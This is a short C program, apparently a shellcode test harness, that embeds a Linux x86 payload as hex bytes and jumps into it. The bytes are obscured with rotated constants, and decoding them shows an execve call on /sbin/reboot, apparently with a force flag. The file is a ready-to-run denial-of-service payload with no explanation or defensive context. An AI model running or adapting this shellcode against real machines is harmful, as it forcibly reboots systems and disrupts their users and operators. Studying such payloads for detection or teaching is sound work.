#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xd2\x52\x68\xc4\xde\xde\xe8\xd1\x0c\x24\x68\xdc\x5e\xe4\xca\xd1\x0c\x24\x68\x5e\xe6\xc4\xd2\xd1\x0c\x24\x89\xe3\x52\x66\x68\x5c\x80\x66\x81\x6c\x24\xfc\x2f\x1a\x89\xe7\x52\x57\x53\x89\xe1\x89\xd0\xb0\x0b\xcd\x80";

main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*CodeFun)() = (int(*)())code;
	CodeFun();
}
